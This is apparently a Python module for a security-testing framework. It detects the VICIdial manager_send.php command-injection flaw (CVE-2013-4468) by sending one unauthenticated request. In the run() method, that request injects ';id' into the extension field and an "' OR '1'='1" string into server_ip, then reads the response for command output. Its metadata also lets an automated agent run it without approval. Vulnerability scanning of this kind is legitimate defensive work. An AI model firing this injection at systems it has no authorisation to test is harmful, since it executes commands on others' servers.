#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""VICIdial manager_send.php command injection (CVE-2013-4468)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VICIdial - manager_send.php RCE Detection (CVE-2013-4468)',
        'description': (
            'Detects CVE-2013-4468/4467 by injecting ;id into extension via '
            '/agc/manager_send.php OriginateVDRelogin.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'vicidial', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-4468',
        ],
        'cve': 'CVE-2013-4468',
    }

    def run(self):
        path = (
            '/agc/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1'
            '&protocol=sip&ACTION=OriginateVDRelogin&session_name=AAAAAAAAAAAA'
            "&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3Bid"
            '&phone_login=squarebox&phone_pass=park&stage=lookup'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='VICIdial manager_send.php RCE (CVE-2013-4468)',
                path='/agc/manager_send.php',
            )
            return True
        return False
